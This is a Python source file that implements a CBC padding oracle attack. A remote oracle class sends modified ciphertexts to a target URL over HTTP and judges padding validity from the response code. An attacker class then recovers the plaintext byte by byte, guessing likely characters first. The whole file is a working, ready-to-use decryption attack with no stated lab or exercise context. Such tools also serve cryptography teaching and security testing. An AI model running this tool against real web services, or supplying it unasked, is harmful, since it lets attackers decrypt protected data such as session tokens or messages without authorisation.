import urllib.request as rq
from typing import Callable, Iterable

class Guesser(object):
    def __init__(self, guess_list: Iterable[int] = None) -> None:
        self.guess_list = guess_list if guess_list else []
    
    def extend(self, guess_list: Iterable[int]) -> None:
        self.guess_list.extend(guess_list)
    
    def Default():
        guesser = Guesser()
        guesser.extend([ord(' ')])                    # 0x20
        guesser.extend(range(ord('a'), ord('z') + 1)) # 0x61 -> 0x7a
        guesser.extend(range(ord('A'), ord('Z') + 1)) # 0x41 -> 0x5a
        guesser.extend(range(0x11))                   # 0x00 -> 0x10
        guesser.extend(range(ord(' ') + 1, ord('0'))) # 0x21 -> 0x2f
        guesser.extend(range(ord('0'), ord('9') + 1)) # 0x30 -> 0x39
        guesser.extend(range(ord('9') + 1, ord('A'))) # 0x3a -> 0x40
        guesser.extend(range(ord('Z') + 1, ord('a'))) # 0x5b -> 0x60
        guesser.extend(range(0x11, ord(' ')))         # 0x11 -> 0x1f
        guesser.extend(range(ord('z') + 1, 128))      # 0x7b -> 0x7f
        return guesser

class PaddingOracle(object):
    def is_valid(self, cipher: bytes) -> bool:
        pass

class CustomPaddingOracle(PaddingOracle):
    def __init__(self, responder: Callable[[bytes], bool]) -> None:
        self.responder = responder
    
    def is_valid(self, cipher: bytes) -> bool:
        return self.responder(cipher)

class RemotePaddingOracle(PaddingOracle):

    def __init__(self, target: str, valid_padding_res_codes: list[int] = [200]):
        self.target = target
        self.valid_codes = valid_padding_res_codes
    
    def is_valid(self, cipher: bytes) -> bool:
        url = self.target + cipher.hex()
        response = None
        try:                                    # Send HTTP request to server
            response = rq.urlopen(url)          # Wait for response
        except rq.HTTPError as e:
            code = e.code
        else:
            code = response.code
        finally:
            if response is not None:
                response.close()
        return code in self.valid_codes

class Attacker(object):
    def __init__(self, po: PaddingOracle, guesser: Guesser, block_size: int = 16) -> None:
        self.check = po.is_valid
        self.guess_list = guesser.guess_list if guesser else range(256)
        self.block_size = block_size
    
    def decrypt(self, cipher: bytes) -> tuple[bytes, int]:
        '''
        Decrypt a ciphertext.
        The strategy is decrypt just 2 continuous cipher blocks each time, the first one is used as IV.
        Return the plaintext of the ciphertext and the number of queries sent to PaddingOracle.
        '''
        if cipher is None:
            raise ValueError('Ciphertext is None.')
        length = len(cipher) - self.block_size
        if length < 0 or (length % self.block_size > 0):
            raise ValueError(f"Ciphertext don't have valid length [BlockSize = {self.block_size}]")
        
        result = bytearray()
        num_blocks = length // self.block_size
        number_of_tries = 0
        for i in range(num_blocks):
            plain, tries = self.decrypt_block(cipher[i * self.block_size:(i + 2) * self.block_size], i == num_blocks - 1)
            result.extend(plain)
            number_of_tries += tries

        return bytes(result), number_of_tries

    def decrypt_block(self, cipher: bytes, last_block: bool = False) -> tuple[bytes, int]:
        '''
        Decrypt the last block in `cipher`
        Set `last_block = True` if in fact the plaintext for this last block has padding.
            (For accelerating the predictor with CBC padding)
        Return the plaintext of the last block and the number of queries sent to PaddingOracle
        '''
        print(f':::Cipher Block: {cipher.hex()}')
        result = bytearray(self.block_size)
        base = len(cipher) - 2 * self.block_size
        prev_block = cipher[base:]
        query = bytearray(cipher)

        number_of_tries = 0
        index = self.block_size - 1
        same_as_prev = last_block
        while index >= 0:
            if same_as_prev and index < self.block_size - 1:
                result[index] = result[index + 1]
                if index + result[index] == self.block_size:
                    same_as_prev = False
            else:
                padd = self.block_size - index                  # Current expected padding
                for i in range(index + 1, self.block_size): 
                    query[base + i] = prev_block[i] ^ result[i] ^ padd
                
                predict, tries = self.__try(query, base + index, prev_block[index])
            
                if predict > -1:
                    result[index] = predict
                    print(f'Predict:{self.block_size - index:>4}/{self.block_size} {chr(predict):>4} [{hex(predict):>3}]\t[Try: {tries}]')
                else:
                    k = base + index
                    print(f'Query:{query[:k].hex()} {query[k:k+1].hex()} {query[k+1:].hex()}')
                    raise ValueError(f'Can not decrypt [index {index:>2}] {result[index:].hex()}\t[Try: {tries}]')
                number_of_tries += tries

            index -= 1

        print(f'===> Decrypted Block: {str(bytes(result)):<60} [Try: {number_of_tries}]')
        return result, number_of_tries

    def __try(self, query: bytearray, query_index: int, ci: int) -> tuple[int, int]:
        '''
        Try to guess a byte at index `query_index` in the `query`
        and send the query to PaddingOracle to check if the query (cipher) is valid padding.
        Return the true byte and the number of queries sent to PaddingOracle
        '''
        padd = len(query) - self.block_size - query_index
        number_of_tries = 0
        for pi in self.guess_list:
            if pi == padd and padd == 1:
                continue
            query[query_index] = ci ^ pi ^ padd

            number_of_tries += 1
            if self.check(query):
                return pi, number_of_tries
        return -1, number_of_tries

 